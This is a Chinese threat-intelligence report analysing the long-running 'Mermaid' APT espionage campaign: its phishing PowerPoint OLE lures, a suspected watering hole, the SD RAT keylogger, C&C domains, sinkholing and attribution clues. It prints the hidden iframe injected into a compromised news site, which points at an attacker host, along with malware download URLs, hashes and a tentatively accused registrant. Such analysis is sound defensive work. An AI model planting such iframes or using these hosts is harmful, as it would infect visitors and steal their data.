> 原文链接: https://www.anquanke.com//post/id/83993 


# 对美人鱼APT行动的一次详细分析报告


                                阅读量   
                                **151698**
                            
                        |
                        
                                                                                    



一个持续6年的针对多国政府机构的网络间谍活动

——攻击丹麦外交部的“美人鱼行动”追踪分析

美人鱼行动是主要针对政府机构,持续时间长达6年的网络间谍活动,已经证实有针对丹麦外交部的攻击。360追日团队早在2015年6月就发现了美人鱼行动,通过对捕获的恶意代码样本进行大数据关联分析后,对这个网络间谍活动进行了全面的追踪分析。

目录

一、概述… 3

二、载荷投递… 4

1.鱼叉邮件:PowerPoint OLE钓鱼文档… 4

2.疑似水坑攻击… 5

3.自身伪装… 7

三、RAT分析… 8

1.功能简述… 8

2.V1和V2版本… 8

3.对抗手法… 8

四、C&amp;C分析… 10

1.WHOIS信息… 10

2.故意混淆误导?无辜受害者?… 10

现象… 10

分析… 11

3.被安全机构sinkhole. 12

五、相关线索信息… 14

1.诱饵文档… 14

2.后门程序… 16

3.作息时间… 18

4.域名WHOIS信息… 19

5.小结… 19

附录A:sophos误报反馈详细记录… 20

报告更新相关时间节点
<td width="568" valign="top">2015年6月23日,形成攻击简报和样本分析报告</td>
<td width="568" valign="top">2015年7月9日,形成综合分析报告</td>
<td width="568" valign="top">2016年1月28日,了解到DDIS报告,更新报告内容</td>
<td width="568" valign="top">2016年4月15日,更新报告内容,公开发布</td>

概述

美人鱼行动是境外APT组织主要针对政府机构的攻击活动,持续时间长达6年的网络间谍活动,已经证实有针对丹麦外交部的攻击。相关攻击行动最早可以追溯到2010年4月,最近一次攻击是在2016年1月。截至目前360追日团队总共捕获到恶意代码样本284个,C&amp;C域名35个。

2015年6月,360追日团队首次注意到美人鱼行动中涉及的恶意代码,并展开关联分析,由于相关恶意代码在中国地区并不活跃,所以当时无法判断其载荷投递的方式和攻击针对目标和领域。但通过大数据关联分析目前我们已经确定相关攻击行动最早可以追溯到2010年4月,以及关联出上百个恶意样本文件,另外360追日团队疑似载荷投递采用了水坑攻击的方式,进一步结合恶意代码中诱饵文件的内容和其他情报数据,初步判定这是一次以窃取敏感信息为目的的针对性攻击,且目标是熟悉英语或波斯语。

2016年1月,丹麦国防部情报局(DDIS,Danish Defence Intelligence Service)所属的网络安全中心(CFCS,Centre for Cyber Security)发布了一份名为“关于对外交部APT攻击的报告”的APT研究报告,报告主要内容是CFCS发现了一起从2014年12月至2015年7月针对丹麦外交部的APT攻击,相关攻击主要利用鱼叉邮件进行载荷投递。

CFCS揭露的这次APT攻击,就是360追日团队在2015年6月发现的美人鱼行动,针对丹麦外交部的相关鱼叉邮件攻击属于美人鱼行动的一部分。从CFCS的报告中360追日团队确定了美人鱼行动的攻击目标至少包括以丹麦外交部为主的政府机构,其载荷投递方式至少包括鱼叉式钓鱼邮件攻击。

通过相关线索分析,360追日团队初步推测美人鱼行动幕后组织来自中东地区。

OLE是Object Linking and Embedding的缩写,即“对象链接与嵌入”,将可执行文件或脚本文件嵌入到文档文件中[[1]](/Users/zhoufei-s/Desktop/%E7%BE%8E%E4%BA%BA%E9%B1%BC%E8%A1%8C%E5%8A%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.docx#_ftn1),虽然没有使用漏洞,但构造的恶意文档文件极具有迷惑性。

攻击者可以在outlook发送邮件时、word文档或PowerPoint幻灯片中构造钓鱼文档,在美人鱼行动中主要是利用PowerPoint OLE钓鱼文档,一般是将PE恶意文件嵌入其中。进一步针对单个PPT文档,攻击者会嵌入多个同样的PE恶意文件,这造成在用户环境执行PPT钓鱼文档后,对弹出的安全警告窗口点击“取消”后会继续弹出,一般安全意识较弱的用户在经过多次操作后没有达到预期效果,则会点击“运行”由此来达到关闭安全警告窗口。

[![](https://p2.ssl.qhimg.com/t01ef96a238e961ef9f.png)](https://p2.ssl.qhimg.com/t01ef96a238e961ef9f.png)

图 1 PowerPoint OLE钓鱼文档执行后的效果

[![](https://p0.ssl.qhimg.com/t01bd88ba2a9ef74d76.png)](https://p0.ssl.qhimg.com/t01bd88ba2a9ef74d76.png)

图 2 PowerPoint OLE钓鱼文档中嵌入了多个PE文件

kurdistannet.org(A Daily Independent Online Kurdish Newspaper)网站被植入了恶意链接,疑似美人鱼行动中发动水坑攻击会基于该网站。这个网站的主要内容是涉及伊拉克库尔德斯坦的相关新闻,网站语言以波斯语为主,也就是被攻击目标是关注库尔德斯坦相关新闻,且熟悉波斯语。

360追日团队在2016年4月14日再次请求访问该网站,通过对页面源码的分析,插入的恶意链接依然还存在尚未删除,也就是kurdistannet网站的管理人员尚未发现相关威胁。但是恶意链接目前来看已经失效了。

[![](https://p2.ssl.qhimg.com/t01d0da16c501a14279.png)](https://p2.ssl.qhimg.com/t01d0da16c501a14279.png)

图 3 kurdistannet网站主页

[![](https://p1.ssl.qhimg.com/t01895e1e4988b9c413.png)](https://p1.ssl.qhimg.com/t01895e1e4988b9c413.png)

图 4 kurdistannet网站被植入恶意链接的源码截图

被挂马网站

kurdistannet.org
<td width="130" valign="top">被植入的恶意代码</td><td width="438" valign="top">&lt;iframe   name="statModules" width="0" height="0"   marginwidth="0" marginheight="0" scrolling="no"   border="0" frameborder="0"   src='http://wpstat.mine.bz/e1/stat1.php'&gt;</td>

&lt;iframe   name="statModules" width="0" height="0"   marginwidth="0" marginheight="0" scrolling="no"   border="0" frameborder="0"   src='http://wpstat.mine.bz/e1/stat1.php'&gt;
<td width="130" valign="top">挂马恶意链接</td><td width="438" valign="top">hXXp://wpstat.mine.bz/e1/stat1.php</td>

hXXp://wpstat.mine.bz/e1/stat1.php
<td width="130" valign="top">Sucuri检测结果</td><td width="438" valign="top">https://sitecheck.sucuri.net/results/kurdistannet.org</td>

https://sitecheck.sucuri.net/results/kurdistannet.org
<td width="130" valign="top">Sucuri检测结果(谷歌快照)</td><td width="438" valign="top">https://webcache.googleusercontent.com/search?q=cache:lLMBPzClHwkJ:https://sitecheck.sucuri.net/results/kurdistannet.org+&amp;cd=7&amp;hl=zh-CN&amp;ct=clnk&amp;gl=tw</td>

(谷歌快照)
<td width="130" valign="top">谷歌快照时间</td><td width="438" valign="top">2016年1月24日 04:25:17 GMT</td>

2016年1月24日 04:25:17 GMT

上表是对kurdistannet网站被挂马的具体记录,通过sucuri谷歌快照的时间,可以确定至少在2016年1月24日kurdistannet网站就已经被植入了恶意链接。

[![](https://p4.ssl.qhimg.com/t01c0bb392eab1c58c2.png)](https://p4.ssl.qhimg.com/t01c0bb392eab1c58c2.png)

图 5 sucuri对kurdistannet网站的检测结果

从以下两个表中,可以看出母体文件有来自URL的情况,从URL最终指向的文件扩展名来看,应该不会是诱导用户点击并执行这类URL。而这类URL有可能是其他downloader木马请求下载或者由漏洞文档、水坑网站在触发漏洞成功后下载执行。

来源URL

http://wep.soon.it/doc/v28n1f1.tmp

http://www.bestupdateserver.com/infy/update.php?cn=nlzoetws011185&amp;ver=6.2&amp;u=3%2f12%2f2015%20%2023%3a50%3a38
<td width="102" valign="top">下载的RAT</td><td width="466" valign="top">1a918a850892c2ca5480702c64c3454c</td>

1a918a850892c2ca5480702c64c3454c

表 1样本来源1

来源URL

http://best.short-name.com/b35f1.tmp
<td width="102" valign="top">下载的RAT</td><td width="466" valign="top">6bc1aea97e7b420b0993eff794ed2aeb</td>

6bc1aea97e7b420b0993eff794ed2aeb

表 2样本来源2

这里主要指对二进制可执行EXE文件,主要从文件名、文件扩展名和文件图标等方面进行伪装。

在美人鱼行动中主要通过winrar的自解压功能将相关样本文件和诱饵文档打包为EXE文件,其中诱饵文档涉及的方面较多,会涉及安装补丁、开发环境、视频、图片、文档等,但就EXE文件母体很少将文件图标替换为文档或图片图标。

美人鱼行动中使用的RAT我们命名为SD RAT,SD RAT主要是通过winrar的自解压功能将自己打包为exe文件,会伪装为安装补丁、开发环境、视频、图片、文档等,如V1版本会伪装成图片文件,V2版本会将自己伪装为aptana的air插件。

主要功能是进行键盘记录,收集用户信息(例如:pc的信息,剪贴板内容等等)然后上传到指定服务器,进一步还会从服务器上下载文件(下载的文件暂时还未找到)并运行。从样本代码本身来看SD RAT主要分为两个版本,大概2012年之前的是早期V1版本,2012年之后至今的为V2版本。

窃取回传的数据

具体信息
<td width="121" valign="top">PC相关信息</td><td width="448" valign="top">计算机名称,用户名称,CPUID,机器ID,IP,当前任务列表,系统版本号,UAC,IE版本,Windows目录,系统目录,临时路径,时区,磁盘空间,系统键盘类型,系统语言等</td>

计算机名称,用户名称,CPUID,机器ID,IP,当前任务列表,系统版本号,UAC,IE版本,Windows目录,系统目录,临时路径,时区,磁盘空间,系统键盘类型,系统语言等
<td width="121" valign="top">.ini 文件</td><td width="448" valign="top">程序安装时间,发送成功次数,发送失败次数和下载次数</td>

程序安装时间,发送成功次数,发送失败次数和下载次数
<td width="121" valign="top">.dat 文件</td><td width="448" valign="top">程序运行的日志和记录的键盘内容,浏览器地址栏的内容以及剪贴板上的内容</td>

程序运行的日志和记录的键盘内容,浏览器地址栏的内容以及剪贴板上的内容

两个版本执行在整体架构上是相同的都是在创建窗口的时候调用了一个函数,在该函数中创建两个定时器一个用来记录剪贴板中最新内容,一个用来下载文件和发送用户信息。

在V1版本中创建了两个定时器一个用来下载文件和发送用户信息另一个则调用GetAsyncKeyState进行键盘记录 ,而在V2版本中通过注册热键,响应相关消息进行键盘记录。在V1版本中则通过setclipboard和响应WM_DRAWCLIPBOARD 消息来记录剪贴板上的内容。V2版本内部之间的主要区别在于URL和相关字符串是否加密,在2015年的近期V2版本中几乎对所有的字符串都进行了加密操作。

虽然两个版本在具体的功能实现的手法上有所区别但整体结构和功能是一致的,甚至连字符串解密的函数都是一样的。

躲避执行?失误?

V2版本会检测avast目录(avast software)是否存在,如果不存在则停止运行。V2版本此处的检测逻辑,不太符合一般恶意代码检测杀毒软件进行对抗的思路,我们推测有两种可能性:

第一种:攻击者重点关注被攻击目标环境存在avast杀软的目标;

第二种:攻击者在开发过程中的失误导致。

谨慎执行

V2检测到其他杀软不会停止运行,而是谨慎执行。

V2版本首先会检测卡巴斯基目录(Kaspersky Lab),判断是否安装了该杀毒软件如果存在则会进行谨慎的删除,如果存在则检测是否存在 C:Documents and SettingsAdministratorApplicationDataAdobeairplugin*.dat,存在则会获取插件的名称,然后删除对应的启动项。如果不存在则会直接将以airplugin开头的相关启动项全部删除。

进一步然后向注册表中添加启动项,在添加启动项的过程中依旧会检测如下杀毒软目录件是否存在。

Norton   Antivirus

Norton   Security

Norton   Internet Security

Norton 360

Symantec   Antivirus

Symantec_Client_Security

SymantecSymantec   Endpoint Protection

Norton 360   Premier Edition

Norton   Security with Backup

如果存在,会通过执行批处理的方式添加如果不存在则直接进行修改注册表。接着会执行删除,然后再次检测上面罗列的杀毒软件,如果存在则将原文件移动过去并重命名如果不存在则直接复制过去重命名。

检测杀软的操作并没有影响最终的结果,只是采取了更加谨慎的操作。

[![](https://p5.ssl.qhimg.com/t01c20598dbc25265b3.png)](https://p5.ssl.qhimg.com/t01c20598dbc25265b3.png)

图 6域名和注册邮箱对应关系

非动态域名,360追日团队通过对主域名的WHOIS信息分析,发现相关域名持有者邮箱主要集中在以下几个邮箱:

aminjalali_58@yahoo.com

aj58mail-box@yahoo.com

kamil_r@mail.com

am54ja@yahoo.com

在我们分析C&amp;C通信的过程中,一个针对安全厂商的误报反馈引起了我们的注意,具体反馈的误报信息如下表和下图所示。

反馈误报相关

具体链接
<td width="130" valign="top">反馈误报的URL</td><td width="438" valign="top">[https://community.sophos.com/products/unified-threat-management/f/55/t/46992](https://community.sophos.com/products/unified-threat-management/f/55/t/46992)  </td>

[https://community.sophos.com/products/unified-threat-management/f/55/t/46992](https://community.sophos.com/products/unified-threat-management/f/55/t/46992)  
<td width="130" valign="top">认为被误报的网站</td><td width="438" valign="top">hXXp://updateserver1.comhXXp://bestupdateserver.com/</td>

hXXp://updateserver1.com

[![](https://p3.ssl.qhimg.com/t0177565144d3ab1693.png)](https://p3.ssl.qhimg.com/t0177565144d3ab1693.png)

图 7 sophos反馈误报页面

aj58在sophos论坛主要反馈sophos产品误报了他持有的两个网站,sophos的UTM是基于McAfee Smartfilter XL,aj58声称McAfee已经更改了网站状态(即非恶意),其中Scott Klassen反馈如果McAfee如果修改状态,则sophos最终也会修改。aj58继续反馈说VT中sophos的检测结果依然是恶意。从目前来看VT中sophos的结果[[2]](/Users/zhoufei-s/Desktop/%E7%BE%8E%E4%BA%BA%E9%B1%BC%E8%A1%8C%E5%8A%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.docx#_ftn2)是未评级网站(Unrated site),也就是已经将恶意状态修改。

在看到以上现象,360追日团队首先是想到了之前发布的《007 黑客组织及其地下黑产活动分析报告》([https://ti.360.com/upload/report/file/Hook007.pdf](https://ti.360.com/upload/report/file/Hook007.pdf))中,出现过攻击者主动联系安全厂商,探测安全厂商检测机制的案例。

以下是就本次事件的具体推测过程:

首先sophos论坛上注册的用户名是aj58,这的确和反馈误报的两个域名WHOIS信息中邮箱地址比较相似“aminjalali_58@yahoo.com”,“aj58mail-box@yahoo.com”,这一现象或许是用户习惯相关用户名,另外就是刻意表示与相关网站具备关联归属性。

进一步aj58声称自己拥有的两个网站,也是美人鱼行动中主要涉及到C&amp;C域名,从2010年至2015年都有涉及到这两个C&amp;C的木马出现,一般情况恶意域名如果曝光或使用次数越多则存活时间则会越短,而如果只是针对特定目标,且控制其传播范围,则C&amp;C域名会存活较长时间。

疑点1:而且从360追日团队的分析来看,这两个C&amp;C域名的作用并非简单的判断网络环境,其作用主要是窃取信息的回传和下载其他恶意程序。这时怀疑有两种可能性,第一:这两个域名属于美人鱼行动幕后组织所注册持有;第二:这两个域名是可信网站,被美人鱼行动幕后组织攻陷作为跳板。

注:

恶意代码判断网络环境:一般恶意代码在执行主要功能之前会判断下本地网络环境,这时会请求一些可信网站,如请求谷歌、微软等网站,如果符合预设的判断条件,则继续执行。

疑点2:进一步360追日团队发现在美人鱼行动中使用的C&amp;C域名,排除动态域名,至少有8个C&amp;C域名与aj58提到的这两个域名注册邮箱相同。这时我们怀疑有两种可能性,第一:这两个域名属于美人鱼行动幕后组织所注册持有;第二:这两个域名和其他8个域名均为可信网站,而美人鱼行动幕后组织只针对aj58所持有的域名进行攻击,并作为跳板。

疑点3:另外这些aj58提到的这两个域名,以及我们发现的其他域名均无对外提供WEB服务或网站页面。

疑点4:注意到aj58是在2015年7月25日反馈误报,而aj58所持有的另外3个域名已经在2015年7月1日被安全机构(virustracker.info)sinkhole了。从aj58在sophos论坛反馈自己网站被误报的情况,360追日团队认为aj58用户对自己网站的安全性还是很关注的。我们推测aj58所持有的网站如果被其他机构接管了,aj58应该会进行反馈质疑,无法知道aj58是否联系virustracker.info,但从这3个网站的最新WHOIS信息来看,持有者仍然是virustracker.info。

short-name.com

bestwebstat.com

myblog2000.com

表 3被安全机构接管的3个C&amp;C域名

其他: aj58是在2015年7月25日反馈误报,CFCS发布的针对丹麦外交部攻击的报告中指出最后一次攻击是2015年7月24日。

通过以上分析推测,360追日团队更倾向aj58就是美人鱼行动幕后组织的成员,但暂时无法确切证明,不排除aj58是无辜的受害者。

在上一小节中已经介绍了美人鱼行动中有3个C&amp;C已经被安全机构接管。一般情况下安全机构对某个域名进行sinkhole接管的时候,是很确定该域名是被攻击者所持有。

已经被安全机构接管的C&amp;C
<td width="102" valign="top">C&amp;C主域名</td><td width="466" valign="top">short-name.combestwebstat.commyblog2000.com</td>

short-name.com

myblog2000.com
<td width="102" rowspan="3">WHOIS信息</td><td width="466" valign="top">2015年7月1日之前:[aj58mail-box@yahoo.com](mailto:aj58mail-box@yahoo.com)</td>

2015年7月1日之前:[aj58mail-box@yahoo.com](mailto:aj58mail-box@yahoo.com)
<td width="466" valign="top">2015年7月1日之前:[aminjalali_58@yahoo.com](mailto:aminjalali_58@yahoo.com)  </td>
<td width="466" valign="top">2015年7月1日之后:[domains@virustracker.info](mailto:domains@virustracker.info)  </td>
<td width="102" rowspan="3">IP</td><td width="466" valign="top">Sinkhole之前:192.69.208.202</td>

Sinkhole之前:192.69.208.202
<td width="466" valign="top">Sinkhole之前:209.236.117.65</td>
<td width="466" valign="top">Sinkhole之后:69.195.129.72</td>

表 4样本来源2

[![](https://p2.ssl.qhimg.com/t01418f1b1d7576758c.png)](https://p2.ssl.qhimg.com/t01418f1b1d7576758c.png)

图 8诱饵文档截图1

[![](https://p3.ssl.qhimg.com/t011f36f8130ad0bc7b.png)](https://p3.ssl.qhimg.com/t011f36f8130ad0bc7b.png)

图 9诱饵文档截图2

从上面两张诱饵PPT截图来看,其中主要语言是波斯语。

样本MD5

oleObject路径
<td width="284" valign="top">260687b5a29d9a8947d514acae695ad4</td><td width="284" valign="top">C:Usersya   hosainDesktoppower point .exe</td>

C:Usersya   hosainDesktoppower point .exe
<td width="284" valign="top">83e90ccf2523cce6dec582cdc3ddf76b</td><td width="284" valign="top">C:UserssalazarDesktoppower point.exe</td>

C:UserssalazarDesktoppower point.exe
<td width="284" valign="top">0096c70453cd7110453b6609a950ce18</td><td width="284" valign="top">C:Users135133128Desktoppower   point.exe</td>

C:Users135133128Desktoppower   point.exe
<td width="284" valign="top">b61b26c9862e74772a864afcbf4feba4</td><td width="284" valign="top">C:Users1001DesktopDesktop.exe</td>

C:Users1001DesktopDesktop.exe
<td width="284" valign="top">ffad81c9cc9a6d1bd77b29c5be16d1b0</td><td width="284" valign="top">C:Usersya   aliDesktophelma22.exe</td>

C:Usersya   aliDesktophelma22.exe
<td width="284" valign="top">7a6e9a6e87e1e43ad188f18ae42f470f</td><td width="284" valign="top">C:UsersbaranDesktopvoavoal.exe</td>

C:UsersbaranDesktopvoavoal.exe

表 5 OLE嵌入的PE文件路径

上表是PPT OLE钓鱼文档中嵌入的PE文件路径,这个路径就是恶意代码作者本机的文件路径,从相关用户名“ya hosain”、“ya ali”来看,这些用户名更多出现在中东地区。

从下表中可以看出诱饵PPT文档属性的标题内容也是波斯语。

تا چه حد حقیقت دارد؟

表 6 PPT文件属性中标题内容

母体

3d186a44960a4edc8e297e1066e4264b
<td width="234" valign="top">视频文件MD5</td><td width="334" valign="top">1c401190a40bc5c03dc5711c57b4b416</td>

1c401190a40bc5c03dc5711c57b4b416
<td width="234" valign="top">视频文件原始文件名</td><td width="334" valign="top">badhejiabshiraz_x264_003.mp4</td>

badhejiabshiraz_x264_003.mp4

[![](https://p5.ssl.qhimg.com/t0182ff9b9289cdfe63.png)](https://p5.ssl.qhimg.com/t0182ff9b9289cdfe63.png)

从上面视频内容和视频原始文件名中的“badhejiab”,都涉及到中东地区。

美人鱼行动中大量样本都存在如下类似情况,即子体文件中会包含一段字符串,相关内容一般是直接复制于新闻网站的内容。相关字符串在样本实际执行的过程中并没有具体作用。

下表是其中一个样本的信息,新闻主要涉及叙利亚相关问题。

母体文件

1a918a850892c2ca5480702c64c3454c
<td width="130" valign="top">子体文件</td><td width="438" valign="top">6e4e52cf69e37d2d540a431f23d7015a</td>

6e4e52cf69e37d2d540a431f23d7015a
<td width="130" valign="top" style="border: none;padding: 0px 7px">文件中字符串</td><td width="438" valign="top" style="border: none;padding: 0px 7px">In his only interview ahead of COP21, the UNs climate   summit which opens next Monday, the Prince of Wales suggested that   environmental issues may have been one of the root causes of the problems in   Syria</td>

In his only interview ahead of COP21, the UNs climate   summit which opens next Monday, the Prince of Wales suggested that   environmental issues may have been one of the root causes of the problems in   Syria
<td width="130" valign="top">涉及到的新闻链接</td><td width="438" valign="top">http://news.sky.com/story/1592373/charles-syrias-war-linked-to-climate-change</td>

http://news.sky.com/story/1592373/charles-syrias-war-linked-to-climate-change

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p2.ssl.qhimg.com/t01595b5ea37b002383.png)

图 10相关新闻页面截图

[![](data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAAAXNSR0IArs4c6QAAAARnQU1BAACxjwv8YQUAAAAJcEhZcwAADsQAAA7EAZUrDhsAAAANSURBVBhXYzh8+PB/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014dc2382a3cf44778.png)

图 11攻击者作息时间

[![](https://p4.ssl.qhimg.com/t01b8ca16d4d034b574.png)](https://p4.ssl.qhimg.com/t01b8ca16d4d034b574.png)

图 12 RAR自解压文件内相关文件时间

C&amp;C域名的注册邮箱:“aminjalali_58@yahoo.com”

[![](https://p4.ssl.qhimg.com/t01be1a19b825883231.png)](https://p4.ssl.qhimg.com/t01be1a19b825883231.png)

图 13相似域名截图[[3]](/Users/zhoufei-s/Desktop/%E7%BE%8E%E4%BA%BA%E9%B1%BC%E8%A1%8C%E5%8A%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.docx#_ftn3)

结合上述线索信息,以及与攻击目标的关系,我们初步推测美人鱼行动幕后组织来自中东地区。

下表是用户名为“aj58”的用户在sophos论坛页面反馈的完整记录:

提交者

aj58
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.07.25   10:53pm</td><td style="border: none;padding: 0" width="476"></td>

2015.07.25   10:53pm
<td width="92" valign="top">具体内容</td><td width="476" valign="top">我在几天前与Sophos联系提交了一个误报,至今仍没收到回复。提交页面https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx我的诉求是:您的产品将我的2个网站判定为恶意您最新的试用版没有在我的网站发现任何恶意软件请尽快将我的网站从您的黑名单中移除我的网站是:http://updateserver1.com  http://bestupdateserver.com/</td><td style="border: none;padding: 0" width="476"></td>

我在几天前与Sophos联系提交了一个误报,至今仍没收到回复。提交页面https://secure2.sophos.com/en-us/threat-center/reassessment-request.aspx

您的产品将我的2个网站判定为恶意

请尽快将我的网站从您的黑名单中移除

http://updateserver1.com  
<td width="92" valign="top">提交者</td><td width="476" valign="top">Scott Klassen(调解员)</td><td style="border: none;padding: 0" width="476"></td>

Scott Klassen(调解员)
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.07.25   5:11pm</td><td style="border: none;padding: 0" width="476"></td>

2015.07.25   5:11pm
<td width="92" valign="top">具体内容</td><td width="476" valign="top">Sophos并不会与用户回联并告知处理结果,除非需要用户提供更多信息,而这种情况几乎从未发生请在https://www.trustedsource.org/上创建一个账户。然后访问https://www.trustedsource.org/en/feedback/url,选择安全网关(UTM)使用的 McAfee Smartfilter XL。当你检查一个URL时,你就可以选择提交一个修正的建议。</td><td style="border: none;padding: 0" width="476"></td>

Sophos并不会与用户回联并告知处理结果,除非需要用户提供更多信息,而这种情况几乎从未发生
<td width="92" valign="top">提交者</td><td width="476" valign="top">Michael   Dunn(Sophos员工)</td><td style="border: none;padding: 0" width="476"></td>

Michael   Dunn(Sophos员工)
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.07.27 3:45pm</td><td style="border: none;padding: 0" width="476"></td>

2015.07.27 3:45pm
<td width="92" valign="top">具体内容</td><td width="476" valign="top">根据VT的检测结果,有多家公司将你鉴定为恶意https://www.virustotal.com/en/url/d3a69436ef78644af0fd671f973aa0b22e8af0f0b0cc4916eeeacd40fd07d540/analysis/如果你确定自己是安全的,那么你可能需要做很多事情了</td><td style="border: none;padding: 0" width="476"></td>

根据VT的检测结果,有多家公司将你鉴定为恶意

如果你确定自己是安全的,那么你可能需要做很多事情了
<td width="92" valign="top">提交者</td><td width="476" valign="top">aj58</td><td style="border: none;padding: 0" width="476"></td>

aj58
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.07.28   10:07pm 回复Michael Dunn</td><td style="border: none;padding: 0" width="476"></td>

2015.07.28   10:07pm 回复Michael Dunn
<td width="92" valign="top">具体内容</td><td width="476" valign="top">McAfee已经更改了有关我的网站的状态我是否需要再次请求Sophos更改我网站的状态?还是过几天会自动更改?</td><td style="border: none;padding: 0" width="476"></td>

McAfee已经更改了有关我的网站的状态
<td width="92" valign="top">提交者</td><td width="476" valign="top">Scott   Klassen</td><td width="476" valign="top">aj58</td>

Scott   Klassen
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.07.29 3:35pm</td><td style="border: none;padding: 0" width="476"></td>

2015.07.29 3:35pm
<td width="92" valign="top">具体内容</td><td width="476" valign="top">Sophos的安全网关使用信任来源的数据库。如果你网站的状态在McAfee X数据库的一个信任来源被更改了,那么几个小时内,你网站的状态在Sophos也会被修改。你并不需要再联系Sophos</td><td style="border: none;padding: 0" width="476"></td>

Sophos的安全网关使用信任来源的数据库。如果你网站的状态在McAfee X数据库的一个信任来源被更改了,那么几个小时内,你网站的状态在Sophos也会被修改。
<td width="92" valign="top">提交者</td><td width="476" valign="top">aj58</td><td style="border: none;padding: 0" width="476"></td>

aj58
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.08.05   10:30am</td><td style="border: none;padding: 0" width="476"></td>

2015.08.05   10:30am
<td width="92" valign="top">具体内容</td><td width="476" valign="top">信任来源的结果在几天前就被修改了,但是VT依然显示我的网站被Sophos检测为恶意</td><td style="border: none;padding: 0" width="476"></td>

信任来源的结果在几天前就被修改了,但是VT依然显示我的网站被Sophos检测为恶意
<td width="92" valign="top">提交者</td><td width="476" valign="top">BAlfson(调解员)</td><td style="border: none;padding: 0" width="476"></td>

BAlfson(调解员)
<td width="92" valign="top">发帖时间</td><td width="476" valign="top">2015.08.05 9:54pm</td><td style="border: none;padding: 0" width="476"></td>

2015.08.05 9:54pm
<td width="92" valign="top">具体内容</td><td width="476" valign="top">用户在这里反馈,对Sophos的检测结果没有任何影响   (注:这是一句法语,大概意思可能是这个)请您在Sophos网站上提交重新评估申请表</td><td style="border: none;padding: 0" width="476"></td>

用户在这里反馈,对Sophos的检测结果没有任何影响   (注:这是一句法语,大概意思可能是这个)

[[3]](/Users/zhoufei-s/Desktop/%E7%BE%8E%E4%BA%BA%E9%B1%BC%E8%A1%8C%E5%8A%A8%E5%88%86%E6%9E%90%E6%8A%A5%E5%91%8A.docx#_ftnref3) http://arjanews.ir/%D8%AC%D9%87%D8%A7%D8%AF-%D9%85%D8%BA%D9%86%DB%8C%D9%87-%D8%A7%D8%B2-%DA%86%D9%87-%D8%B2%D9%85%D8%A7%D9%86-%D8%AA%D8%AD%D8%AA-%D9%86%D8%B8%D8%A7%D8%B1%D8%AA-%D8%B3%D8%B1%D8%AF%D8%A7%D8%B1-%D8%B3/
